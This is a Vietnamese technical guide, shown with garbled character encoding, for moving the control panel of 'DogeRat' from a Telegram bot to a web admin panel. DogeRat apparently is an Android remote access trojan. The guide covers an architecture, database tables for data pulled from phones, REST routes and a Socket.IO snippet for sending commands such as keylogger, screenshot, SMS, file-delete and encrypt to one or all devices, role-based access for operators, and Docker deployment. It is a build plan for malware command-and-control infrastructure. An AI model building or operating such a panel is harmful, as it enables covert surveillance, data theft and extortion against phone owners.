## ğŸ“„ TÃ i liá»‡u 1 â€“ HÆ°á»›ng dáº«n chuyá»ƒn Ä‘á»•i** ****Telegramâ€‘Bot admin** â†’** ****Webâ€‘Admin** cho DogeRat

*(DÃ nh cho nhÃ¢n viÃªn ká»¹ thuáº­t â€“ cáº¥pâ€¯1 vÃ  cáº¥pâ€¯2)*

---

### 1ï¸âƒ£ Tá»•ng quan kiáº¿n trÃºc má»›i

| ThÃ nh pháº§n                             | MÃ´ táº£                                                                                                                                                   | CÃ´ng nghá»‡ Ä‘á» xuáº¥t                                                                                                                                    |
| ---------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Server core**                    | Xá»­ lÃ½ káº¿t ná»‘i Socket.IO vá»›i cÃ¡c thiáº¿t bá»‹ Android (APK).                                                                                           | Node.jsâ€¯+â€¯Expressâ€¯+â€¯Socket.IO (giá»¯ nguyÃªn `server.js` hiá»‡n cÃ³, nhÆ°ng tÃ¡ch riÃªng pháº§n Bot).                                                  |
| **Webâ€‘Admin panel**               | Giao diá»‡n quáº£n trá»‹ trÃªn trÃ¬nh duyá»‡t Ä‘á»ƒ thá»±c hiá»‡n má»i lá»‡nh hiá»‡n cÃ³ (contacts, screenshot, keylogger, â€¦) vÃ  quáº£n lÃ½ ngÆ°á»i dÃ¹ng.        | Reactâ€¯+â€¯Vite**hoáº·c** Vueâ€¯+â€¯Vite **hoáº·c** Angular (SPA). Giao diá»‡n Admin sáº½ gá»i API REST/WS tá»›i Server core.                         |
| **REST API**                       | Cung cáº¥p cÃ¡c endpoint cho Webâ€‘Admin (login, CRUD user, láº¥y danh sÃ¡ch device, gá»­i lá»‡nh).                                                            | Express Router (tÃ¡ch thÃ nh `routes/api/*.js`).                                                                                                        |
| **WebSocket bridge**               | Äá»ƒ truyá»n lá»‡nh thá»i gian thá»±c tá»›i thiáº¿t bá»‹, Webâ€‘Admin sáº½ dÃ¹ng Socket.IO client (hoáº·c HTTPâ€‘POST â€œcommandâ€ â†’ Server â†’ emit).              | `socket.io-client` trÃªn frontend hoáº·c sá»­ dá»¥ng cÃ¹ng `io` trÃªn server.                                                                            |
| **CÆ¡ sá»Ÿ dá»¯ liá»‡u**              | LÆ°u trá»¯ ngÆ°á»i dÃ¹ng, vai trÃ², nháº­t kÃ½ hÃ nh Ä‘á»™ng, danh sÃ¡ch thiáº¿t bá»‹, tráº¡ng thÃ¡i thiáº¿t bá»‹, dá»¯ liá»‡u thu tháº­p (contacts, sms, files,â€¦). | PostgreSQL**hoáº·c** MySQL (SQL) â€“ dá»… má»Ÿ rá»™ng, ACID, quan há»‡ ngÆ°á»iâ€‘dÃ¹ngâ€‘thiáº¿tâ€‘bá»‹. CÃ³ thá»ƒ dÃ¹ng SQLite cho mÃ´i trÆ°á»ng thá»­ nghiá»‡m. |
| **Authentication / Authorization** | ÄÄƒng nháº­p JWT, phÃ¢n quyá»n dá»±a trÃªn**Roles** (Admin, Manager, Operator, Viewer).                                                              | `passport` + `passport-jwt` hoáº·c `jsonwebtoken`. Middleware `authorize(['admin','operator'])`.                                                   |
| **Cáº¥u hÃ¬nh**                     | `config/` chá»©a `default.json`, `production.json`, â€¦ (port, JWT secret, DB connection, token Telegram (Ä‘á»ƒ há»— trá»£ legacy náº¿u cáº§n)).           | `config` npm package hoáº·c `dotenv`.                                                                                                                  |
| **Logging & Monitoring**           | Ghi láº¡i má»i request, lá»‡nh gá»­i, pháº£n há»“i thiáº¿t bá»‹, lá»—i.                                                                                           | `winston` + `morgan`. CÃ³ thá»ƒ tÃ­ch há»£p Grafana/Prometheus cho metrics.                                                                             |
| **Security**                       | CORS, Rateâ€‘limit, Helmet, CSRF (náº¿u dÃ¹ng cookies), Input validation (`express-validator`).                                                           | `helmet`, `express-rate-limit`, `csurf`.                                                                                                            |
| **Deploy**                         | Dockerâ€‘compose (serviceâ€¯server, serviceâ€¯db, serviceâ€¯admin).                                                                                           | Dockerfile cho Node, Dockerfile cho UI,`docker-compose.yml`.                                                                                            |

---

### 2ï¸âƒ£ CÃ¡c bÆ°á»›c triá»ƒn khai (Chi tiáº¿t dá»± Ã¡n)

#### 2.1 Chuáº©n bá»‹ mÃ´i trÆ°á»ng

1. **Node.js** â‰¥â€¯18,** ****npm** â‰¥â€¯9.
2. **PostgreSQL** (hoáº·c MySQL) â€“ táº¡o database** **`dogerat`.
3. **Git** â€“ clone repo gá»‘c, táº¡o nhÃ¡nh** **`feature/web-admin`.

#### 2.2 TÃ¡i cáº¥u trÃºc dá»± Ã¡n

```
dogerat/
â”‚
â”œâ”€ server/                 # Backend (Node/Express)
â”‚   â”œâ”€ src/
â”‚   â”‚   â”œâ”€ config/         # config/*.json hoáº·c .env
â”‚   â”‚   â”œâ”€ db/             # init DB, models (Sequelize hoáº·c TypeORM)
â”‚   â”‚   â”œâ”€ routes/
â”‚   â”‚   â”‚   â”œâ”€ api/
â”‚   â”‚   â”‚   â”‚   â”œâ”€ auth.js
â”‚   â”‚   â”‚   â”‚   â”œâ”€ devices.js
â”‚   â”‚   â”‚   â”‚   â””â”€ commands.js
â”‚   â”‚   â”‚   â””â”€ webhook.js
â”‚   â”‚   â”œâ”€ services/
â”‚   â”‚   â”‚   â””â”€ telegramBot.js   # (optional only for legacy)
â”‚   â”‚   â”œâ”€ utils/
â”‚   â”‚   â”‚   â””â”€ socketBridge.js   # emit command to sockets
â”‚   â”‚   â””â”€ index.js
â”‚   â””â”€ Dockerfile
â”‚
â”œâ”€ admin/                 # Frontend (React/Vue)
â”‚   â”œâ”€ src/
â”‚   â”‚   â”œâ”€ pages/
â”‚   â”‚   â”‚   â”œâ”€ Login.vue / Login.jsx
â”‚   â”‚   â”‚   â”œâ”€ Dashboard.vue / Dashboard.jsx
â”‚   â”‚   â”‚   â”œâ”€ Devices.vue
â”‚   â”‚   â”‚   â””â”€ DeviceDetail.vue
â”‚   â”‚   â”œâ”€ store/        # Vuex/Redux (user, devices, actions)
â”‚   â”‚   â”œâ”€ router/
â”‚   â”‚   â””â”€ services/
â”‚   â”‚       â””â”€ api.js   # axios wrapper (JWT token)
â”‚   â””â”€ Dockerfile
â”‚
â”œâ”€ docker-compose.yml
â””â”€ README.md
```

#### 2.3 Thiáº¿t káº¿ DB (ER diagram Ä‘Æ¡n giáº£n)

| Table                 | Columns                                                                                                                                                          | Ghi chÃº                                         |
| --------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------ |
| **users**       | `id PK`, `username`, `email`, `password_hash`, `role` (enum), `created_at`, `updated_at`                                                           | Máº­t kháº©u bÄƒm báº±ng bcrypt.                    |
| **devices**     | `id PK`, `socket_id`, `device_id`, `model`, `ip`, `user_agent`, `last_seen_at`, `owner_user_id FK â†’ users(id)`                                  | Khi socket káº¿t ná»‘i, táº¡o/ cáº­p nháº­t báº£n ghi. |
| **device_logs** | `id PK`, `device_id FK`, `type` (sms, call, location, â€¦), `payload JSON`, `created_at`                                                                | LÆ°u trá»¯ dá»¯ liá»‡u nháº­n tá»« thiáº¿t bá»‹.        |
| **commands**    | `id PK`, `device_id FK`, `command`, `params JSON`, `status` (pending, sent, ok, error), `created_by FK â†’ users(id)`, `created_at`, `updated_at` | Theo dÃµi lá»‡nh Ä‘Ã£ gá»­i.                       |
| **audit_trail** | `id PK`, `user_id FK`, `action`, `target_id`, `target_type`, `metadata JSON`, `timestamp`                                                          | Kiá»ƒm toÃ¡n (ai lÃ m gÃ¬).                       |

> **LÆ°u Ã½** : Sá»­ dá»¥ng ORM (Sequelize, TypeORM) Ä‘á»ƒ tá»± Ä‘á»™ng táº¡o migration.

#### 2.4 XÃ¢y dá»±ng API

| Method                                  | URL                                        | MÃ´ táº£                                                         | Middleware |
| --------------------------------------- | ------------------------------------------ | --------------------------------------------------------------- | ---------- |
| `POST /api/auth/login`                | ÄÄƒng nháº­p, tráº£ vá» JWT.                | `validateLogin`                                               |            |
| `POST /api/auth/register`(admin only) | Táº¡o ngÆ°á»i dÃ¹ng má»›i.                   | `authorize('admin')`                                          |            |
| `GET /api/devices`                    | Danh sÃ¡ch thiáº¿t bá»‹ hiá»‡n táº¡i.          | `authorize(['admin','manager','operator'])`                   |            |
| `GET /api/devices/:id`                | Chi tiáº¿t thiáº¿t bá»‹ + logs.               | `authorize`                                                   |            |
| `POST /api/devices/:id/command`       | Gá»­i lá»‡nh (payload:`{command, params}`) | `authorize('operator')` -> gá»i `socketBridge.emitCommand`. |            |
| `GET /api/commands/:id/status`        | Kiá»ƒm tra tráº¡ng thÃ¡i lá»‡nh.              | `authorize`                                                   |            |
| `GET /api/audit`                      | Lá»‹ch sá»­ hÃ nh Ä‘á»™ng (admin only).       | `authorize('admin')`                                          |            |

**Socket Bridge** (`services/socketBridge.js`):

```js
module.exports.emitCommand = (deviceId, command, params) => {
  const target = deviceId === 'all' ? io.sockets : io.to(deviceId);
  target.emit('commend', { request: command, extras: Object.entries(params).map(([k,v])=>({key:k,value:v})) });
};
```

#### 2.5 XÃ¢y dá»±ng Frontend

1. **Login page** â€“ láº¥y token JWT, lÆ°u vÃ o** **`localStorage`/`sessionStorage`, thÃªm** **`Authorization: Bearer <token>` cho má»i request.
2. **Dashboard** â€“ hiá»ƒn thá»‹ sá»‘ lÆ°á»£ng device, biá»ƒu Ä‘á»“ (online/offline) dÃ¹ng Chart.js.
3. **Device List** â€“ báº£ng (DataTables) cho phÃ©p** ** **filter** ,** ** **search** ,** ****select** (single hoáº·c â€œAllâ€).
4. **Device Detail** â€“ khi chá»n, hiá»‡n cÃ¡c** ****actions** (contacts, sms, toast, â€¦) dÆ°á»›i dáº¡ng** ****modal** hoáº·c** ** **dropdown** . Khi ngÆ°á»i dÃ¹ng chá»n action, UI má»Ÿ** ****form** (vÃ­ dá»¥ toast: nháº­p text). Khi submit, gá»i API** **`/api/devices/:id/command`.
5. **Quáº£n lÃ½ ngÆ°á»i dÃ¹ng** â€“ trang** ****User Management** (admin). Cho phÃ©p** ** **gÃ¡n role** ,** ** **reset password** .
6. **Audit Log** â€“ báº£ng lá»‹ch sá»­, filter theo ngÆ°á»i dÃ¹ng, thá»i gian.

> UI cÃ³ thá»ƒ dÃ¹ng** ****TailwindCSS** +** ****Headless UI** Ä‘á»ƒ nhanh chÃ³ng xÃ¢y dá»±ng giao diá»‡n hiá»‡n Ä‘áº¡i.

#### 2.6 PhÃ¢n quyá»n chi tiáº¿t (RBAC)

| Role               | Quyá»n                                                                                                                                                                      |
| ------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **admin**    | ToÃ n quyá»n: táº¡o/ xÃ³a ngÆ°á»i dÃ¹ng, xem audit, quáº£n lÃ½ thiáº¿t bá»‹, gá»­i lá»‡nh báº¥t ká»³.                                                                               |
| **manager**  | Xem danh sÃ¡ch thiáº¿t bá»‹, xem logs, gá»­i lá»‡nh**Ä‘á»c** (contacts, clipboard, location) vÃ  **háº¡n cháº¿** lá»‡nh nguy hiá»ƒm (keylogger, fileâ€‘delete, encrypt). |
| **operator** | Gá»­i háº§u háº¿t cÃ¡c lá»‡nh thá»±c thi (toast, sms, vibrate, openâ€‘url) â€“ khÃ´ng Ä‘Æ°á»£c xem logs, khÃ´ng Ä‘Æ°á»£c quáº£n lÃ½ ngÆ°á»i dÃ¹ng.                                    |
| **viewer**   | Chá»‰ xem danh sÃ¡ch thiáº¿t bá»‹, tráº¡ng thÃ¡i, khÃ´ng gá»­i lá»‡nh.                                                                                                            |

Middleware vÃ­ dá»¥ (`middlewares/authorize.js`):

```js
module.exports = (allowedRoles) => (req,res,next) => {
  const role = req.user.role;
  if (allowedRoles.includes(role)) return next();
  return res.status(403).json({msg:'Forbidden'});
};
```

#### 2.7 Xá»­ lÃ½ Ä‘á»“ng bá»™ thiáº¿t bá»‹

* Khi socket** ****connect** â†’ táº¡o/ cáº­p nháº­t báº£n ghi** **`devices` (IP, model, socket_id).
* Khi** ****disconnect** â†’ cáº­p nháº­t** **`last_seen_at = NULL` hoáº·c** **`status = offline`.
* Thiáº¿t bá»‹ gá»­i** ****heartbeat** (`ping` má»—i 5s) â†’ server cáº­p nháº­t** **`last_seen_at`.
* API** **`/api/devices` tráº£ vá»** **`status: online/offline` dá»±a trÃªn thá»i gian** **`last_seen_at`(Ä‘áº¿m ngÆ°á»£c 15s).

#### 2.8 CÆ¡ cháº¿ lÆ°u trá»¯ dá»¯ liá»‡u thiáº¿t bá»‹

* Khi bot (bÃ¢y giá» lÃ  server) nháº­n dá»¯ liá»‡u tá»« thiáº¿t bá»‹ (contact, sms, location, file...),** ****emit** event** **`device-data` tá»›i server.
* Server sáº½** ****persist** vÃ o báº£ng tÆ°Æ¡ng á»©ng (`device_logs`,** **`files`â€¦) vÃ  tráº£ vá»** ****ACK** cho client.
* File binary Ä‘Æ°á»£c táº£i lÃªn thÆ° má»¥c** **`uploads/` vÃ  lÆ°u Ä‘Æ°á»ng dáº«n trong DB Ä‘á»ƒ Admin cÃ³ thá»ƒ download.

#### 2.9 Báº£o máº­t & Kiá»ƒm tra

| Má»¥c                       | Kiá»ƒm tra                                                                |
| -------------------------- | ------------------------------------------------------------------------ |
| **HTTPS**            | DÃ¹ng**nginx** lÃ m reverseâ€‘proxy TLS termination (letsencrypt).  |
| **CORS**             | Chá»‰ cho phÃ©p origin cá»§a admin UI (`https://admin.myâ€‘dogerat.com`). |
| **Rate limiting**    | `express-rate-limit` â€“ 100 req/5â€¯min per IP.                         |
| **Input validation** | `express-validator` cho má»i body/params.                              |
| **Password**         | bcrypt 12 rounds, khÃ´ng lÆ°u plain text.                                |
| **JWT expiration**   | 1â€¯h + refresh token (optional).                                         |
| **Penâ€‘test**        | Sá»­ dá»¥ng OWASP ZAP hoáº·c Burp Ä‘á»ƒ scan.                                |

#### 2.10 Docker & CI/CD

**docker-compose.yml (sample)**

```yaml
version: "3.8"
services:
  db:
    image: postgres:16-alpine
    environment:
      POSTGRES_DB: dogerat
      POSTGRES_USER: dogerat
      POSTGRES_PASSWORD: ${DB_PASS}
    volumes:
      - db_data:/var/lib/postgresql/data

  server:
    build: ./server
    env_file: .env
    depends_on:
      - db
    ports:
      - "3000:3000"
    restart: unless-stopped

  admin:
    build: ./admin
    env_file: .env
    depends_on:
      - server
    ports:
      - "8080:80"
    restart: unless-stopped

volumes:
  db_data:
```

**CI (GitHub Actions)**

* `npm ci` â†’ lint â†’ unit test (`jest` cho backend,** **`vitest` cho frontend) â†’ build Docker images â†’ push tá»›i registry â†’ deploy (Docker Swarm / Kubernetes).

---

### 3ï¸âƒ£ CÃ¡c thay Ä‘á»•i chÃ­nh trong** **`server.js` (hoáº·c** **`src/index.js`)

1. **XÃ³a má»i Ä‘oáº¡n liÃªn quan Ä‘áº¿n Telegram Bot** (pháº§n** **`TelegramBot`,** **`bot.on('text', ...)`,** **`bot.sendMessage`,** **`bot.sendDocument`).
2. **ThÃªm middleware API** :** **`app.use('/api', apiRouter);` â€“ router Ä‘Æ°á»£c tÃ¡ch ra trong** **`routes/api/*.js`.
3. **Káº¿t ná»‘i DB** :** **`require('./db')` â†’ khá»Ÿi táº¡o Sequelize/TypeORM, sync models.
4. **Cáº­p nháº­t socket events** :

* Khi nháº­n** **`text` tá»« thiáº¿t bá»‹ â†’ gá»­i HTTP POST tá»›i** **`/api/devices/:id/data` (hoáº·c lÆ°u trá»±c tiáº¿p).
* Khi client (admin UI) gá»­i lá»‡nh â†’ API sáº½ gá»i** **`socketBridge.emitCommand`.

1. **ThÃªm JWT authentication** cho má»i API (`passport.authenticate('jwt', {session:false})`).
2. **Cáº¥u hÃ¬nh CORS** :** **`app.use(cors({origin: process.env.FRONTEND_URL, credentials:true}));`.
3. **Logging** :** **`app.use(morgan('combined'));`,** **`logger.error(...)`.
4. **Export** : váº«n** **`module.exports = {app, server, io}` (khÃ´ng cÃ²n** **`bot`).

> **Tip** : Giá»¯ má»™t** ****phiÃªn báº£n legacy** (`telegramBot.js`) trong** **`services/` Ä‘á»ƒ cÃ³ thá»ƒ báº­t láº¡i nhanh náº¿u cáº§n (Ä‘á»‘i vá»›i cÃ¡c khÃ¡ch hÃ ng váº«n muá»‘n Telegram).

---

### 4ï¸âƒ£ Quy trÃ¬nh triá»ƒn khai cho nhÃ¢n viÃªn

| BÆ°á»›c                                | NgÆ°á»i thá»±c hiá»‡n | MÃ´ táº£                                                        |
| ------------------------------------- | ------------------- | -------------------------------------------------------------- |
| **1. Clone & branch**           | Devâ€‘1              | `git checkout -b feature/web-admin`                          |
| **2. CÃ i DB & env**            | Devâ€‘2              | Táº¡o `.env` (DB_URL, JWT_SECRET, FRONTEND_URL, PORT).        |
| **3. Backend refactor**         | Devâ€‘1              | TÃ¡ch Telegram â†’ API, thÃªm DB, JWT.                          |
| **4. Frontend scaffold**        | Devâ€‘3              | `npm create vite@latest admin --template vue` (hoáº·c react). |
| **5. UI + Auth**                | Devâ€‘3              | XÃ¢y login, route guard dá»±a trÃªn role.                       |
| **6. Integration**              | Devâ€‘1 & Devâ€‘3     | Test socketâ€‘command flow (dev tools, Postman).                |
| **7. Unit / Integration tests** | QA                  | Cháº¡y `npm test`.                                            |
| **8. Docker build**             | Devâ€‘2              | `docker compose up -d --build`.                              |
| **9. QA & Security scan**       | Securityâ€‘Team      | Penâ€‘test, OWASP checklist.                                    |
| **10. Release**                 | Ops                 | Tag `v2.0.0-web` â†’ push images â†’ cáº­p nháº­t prod.          |

---

### 5ï¸âƒ£ Kiá»ƒm tra cuá»‘i cÃ¹ng (Checklist)

* [ ] **Telegram Bot** Ä‘Ã£ Ä‘Æ°á»£c táº¯t hoáº·c comment toÃ n bá»™.
* [ ] **API** tráº£ vá» JSON chuáº©n, cÃ³** **`status` vÃ ** **`message`.
* [ ] **JWT** Ä‘Æ°á»£c táº¡o vÃ  kiá»ƒm chá»©ng (expires 1â€¯h).
* [ ] **RBAC** hoáº¡t Ä‘á»™ng: ngÆ°á»i dÃ¹ng khÃ´ng Ä‘á»§ quyá»n nháº­n 403.
* [ ] **Device list** Ä‘á»“ng bá»™ vá»›i socket connections.
* [ ] **Lá»‡nh** Ä‘Æ°á»£c gá»­i tá»« UI â†’ server â†’ socket â†’ thiáº¿t bá»‹, thiáº¿t bá»‹ tráº£ vá» dá»¯ liá»‡u vÃ  lÆ°u DB.
* [ ] **File upload** lÆ°u trong** **`uploads/` vÃ  Ä‘Æ°á»ng dáº«n trong DB.
* [ ] **Audit log** ghi Ä‘áº§y Ä‘á»§ hÃ nh Ä‘á»™ng (login, command, userâ€‘manage).
* [ ] **HTTPS** (nginx) hoáº¡t Ä‘á»™ng,** ****CORS** chá»‰ cho phÃ©p origin cá»§a admin.
* [ ] **Docker** khá»Ÿi Ä‘á»™ng thÃ nh cÃ´ng, logs khÃ´ng cÃ³ lá»—i.
